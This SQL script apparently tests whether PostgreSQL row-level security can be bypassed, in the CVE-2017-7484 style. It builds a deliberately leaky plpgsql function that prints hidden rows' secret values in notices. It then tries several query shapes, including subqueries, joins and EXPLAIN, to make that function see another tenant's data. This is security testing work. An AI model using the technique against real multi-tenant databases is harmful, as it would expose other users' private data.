-- 08_leaky_operator.sql
-- Hypothesis (class 2): a non-leakproof function in the user's WHERE clause is
-- evaluated on RLS-hidden rows before the security qual filters them, leaking
-- the hidden values via the error message (CVE-2017-7484 style).
\set ON_ERROR_STOP 0
DROP TABLE IF EXISTS t CASCADE;
DROP ROLE IF EXISTS alice;
CREATE ROLE alice LOGIN;

CREATE TABLE t (id int, tenant text, secret text);
INSERT INTO t VALUES (1,'alice','A-visible'), (2,'bob','B-HIDDEN-SECRET');
ALTER TABLE t ENABLE ROW LEVEL SECURITY;
ALTER TABLE t FORCE ROW LEVEL SECURITY;
CREATE POLICY p ON t USING (tenant = current_user);
GRANT SELECT ON t TO alice;

-- A deliberately leaky, NON-leakproof function: raises the value it sees.
CREATE FUNCTION leak(txt text) RETURNS bool AS $$
BEGIN
  RAISE NOTICE 'LEAK saw: %', txt;
  RETURN true;
END $$ LANGUAGE plpgsql;   -- plpgsql funcs are NOT leakproof by default

\echo '=== alice queries with leaky predicate. If barrier holds, leak() only sees A-visible ==='
SET ROLE alice;
SELECT id FROM t WHERE leak(secret);
\echo '=== try to force pushdown with a subquery / OFFSET 0 fence bypass attempt ==='
SELECT id FROM (SELECT * FROM t) sub WHERE leak(secret);
\echo '=== try via a join that might reorder ==='
SELECT t.id FROM t, (VALUES (1),(2)) v(x) WHERE leak(t.secret) AND t.id = v.x;
RESET ROLE;
\echo '=== EXPLAIN as alice to see qual placement ==='
SET ROLE alice;
EXPLAIN (COSTS OFF) SELECT id FROM t WHERE leak(secret);
RESET ROLE;
